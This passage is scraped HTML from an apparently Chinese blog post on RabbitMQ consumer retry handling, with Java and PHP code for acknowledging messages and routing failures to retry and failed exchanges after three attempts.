class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 消息消费处理\r\nConsumer consumer = new DefaultConsumer(channel) {\r\n    @ Override\r\n    public void handleDelivery(String consumerTag, Envelope envelope,\r\n                               AMQP.BasicProperties properties, byte[] body) throws IOException {\r\n        ...\r\n        // 注意，由于使用了basicConsume的autoAck特性，因此这里就不需要手动执行\r\n        // channel.basicAck(envelope.getDeliveryTag(), false);\r\n    }\r\n};\r\n// 执行消息消费处理\r\nchannel.basicConsume(\r\n    queueName, \r\n    true, // autoAck\r\n    consumer\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72a242750102-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72a242750102-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72a242750102-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72a242750102-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72a242750102-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72a242750102-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72a242750102-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72a242750102-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72a242750102-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72a242750102-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72a242750102-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72a242750102-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72a242750102-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72a242750102-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72a242750102-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72a242750102-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72a242750102-1\"><span class=\"crayon-c\">// 消息消费处理</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72a242750102-2\"><span class=\"crayon-e\">Consumer </span><span class=\"crayon-v\">consumer</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">DefaultConsumer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72a242750102-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Override</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72a242750102-4\"><span class=\"crayon-e\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">handleDelivery</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">consumerTag</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Envelope </span><span class=\"crayon-v\">envelope</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72a242750102-5\"><span class=\"crayon-h\">                               </span><span class=\"crayon-v\">AMQP</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">BasicProperties </span><span class=\"crayon-v\">properties</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">byte</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">body</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">throws</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">IOException</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72a242750102-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72a242750102-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 注意，由于使用了basicConsume的autoAck特性，因此这里就不需要手动执行</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72a242750102-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// channel.basicAck(envelope.getDeliveryTag(), false);</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72a242750102-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72a242750102-10\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72a242750102-11\"><span class=\"crayon-c\">// 执行消息消费处理</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72a242750102-12\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">basicConsume</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72a242750102-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72a242750102-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// autoAck</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72a242750102-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">consumer</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72a242750102-16\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca72e502497343\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$this-&gt;channel-&gt;basic_consume(\r\n    $queueName,\r\n    '',    // customer_tag\r\n    false, // no_local\r\n    false, // no_ack\r\n    false, // exclusive\r\n    false, // nowait\r\n    function (AMQPMessage $msg) use ($queueName, $routingKey, $callback) {\r\n        ...\r\n        $msg-&gt;delivery_info['channel']-&gt;basic_ack($msg-&gt;delivery_info['delivery_tag']);\r\n    }\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72e502497343-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72e502497343-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72e502497343-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72e502497343-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72e502497343-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72e502497343-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72e502497343-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72e502497343-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72e502497343-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72e502497343-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca72e502497343-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca72e502497343-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72e502497343-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">basic_consume</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72e502497343-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72e502497343-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">''</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// customer_tag</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72e502497343-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// no_local</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72e502497343-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// no_ack</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72e502497343-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// exclusive</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72e502497343-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// nowait</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72e502497343-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">AMQPMessage</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">use</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">callback</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72e502497343-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72e502497343-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">delivery_info</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'channel'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">basic_ack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">delivery_info</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'delivery_tag'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca72e502497343-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca72e502497343-12\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p>如果消息处理中出现异常，应该将该消息重新投递到重试Exchange，等待下次重试</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca731453097651\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbasic_publish(msg, 'master.retry', routing-key)\r\nack(delivery-tag) // 不要忘记了应答消费成功消息</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca731453097651-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca731453097651-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca731453097651-1\"><span class=\"crayon-e\">basic_publish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master.retry'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routing</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca731453097651-2\"><span class=\"crayon-e\">ack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">delivery</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tag</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 不要忘记了应答消费成功消息</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>如果判断重试次数大于3次，仍然处理失败，则应该讲消息投递到失败Exchange，等待人工处理</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca735426157720\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbasic_publish(msg, 'master.failed', routing-key)\r\nack(delivery-tag) // 不要忘记了应答消费成功消息</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca735426157720-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca735426157720-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca735426157720-1\"><span class=\"crayon-e\">basic_publish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master.failed'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routing</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca735426157720-2\"><span class=\"crayon-e\">ack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">delivery</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tag</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 不要忘记了应答消费成功消息</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<blockquote><p>一定不要忘记ack消息，因为重试、失败都是通过将消息重新投递到重试、失败Exchange来实现的，如果忘记ack，则该消息在超时或者连接断开后，会重新被重新投递给消费者，如果消费者依旧无法处理，则会造成死循环。</p></blockquote>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca738080917229\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntry {\r\n    String message = new String(body, \"UTF-8\");\r\n    // 消息处理函数\r\n    handler.handle(message, envelope.getRoutingKey());\r\n\r\n} catch (Exception e) {\r\n    long retryCount = getRetryCount(properties);\r\n    if (retryCount &gt; 3) {\r\n        // 重试次数大于3次，则自动加入到失败队列\r\n        channel.basicPublish(\"master.failed\", envelope.getRoutingKey(), MessageProperties.PERSISTENT_BASIC, body);\r\n    } else {\r\n        // 重试次数小于3，则加入到重试队列，30s后再重试\r\n        channel.basicPublish(\"master.retry\", envelope.getRoutingKey(), properties, body);\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca738080917229-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca738080917229-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca738080917229-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca738080917229-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca738080917229-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca738080917229-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca738080917229-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca738080917229-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca738080917229-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca738080917229-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca738080917229-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca738080917229-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca738080917229-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca738080917229-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca738080917229-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca738080917229-1\"><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca738080917229-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">message</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">body</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"UTF-8\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca738080917229-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 消息处理函数</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca738080917229-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">handler</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">handle</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">message</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">envelope</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getRoutingKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca738080917229-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca738080917229-6\"><span class=\"crayon-sy\">}</span><span 